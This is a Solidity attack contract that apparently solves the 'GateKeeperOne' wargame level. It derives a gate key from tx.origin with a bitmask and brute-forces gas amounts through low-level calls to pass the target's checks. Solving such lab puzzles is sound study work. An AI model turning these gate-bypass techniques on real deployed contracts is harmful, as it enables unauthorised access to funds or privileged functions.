// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface GateKeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Atttack {
    address private target;

    constructor(address addr) {
        target = addr;
    }

    function attack() public {
        // gateThree: 1. cast address into uint160 (since address is 160 bits long)
        // gateThree: 2. cast uint160 into uint64 (since the key passed into the function is bytes8 = 64 bits long)
        // gateThree: 3. perform AND bitwise operation with the mask then cast the result into bytes8
        // b0 b1 b2 b3 must not be zero, b4 b5 should be zero, and b6 b7 should match the last two bytes of tx.origin
        bytes8 key = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);

        // gateTwo: iterate through an additional gas amounts from 0 to 8190 until (8191*3+i)-gasUsed % 8191 = 0
        for (uint256 i = 0; i < 8191; ++i) {
            // gateTwo: target.enter{gas: 8191*3+i}(key); -> will revert!
            // gateTwo: Use call() to handle function call instead
            (bool success, ) = target.call{gas: 8191*3+i}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );

            if (success) {
                break;
            }
        }
    }
}
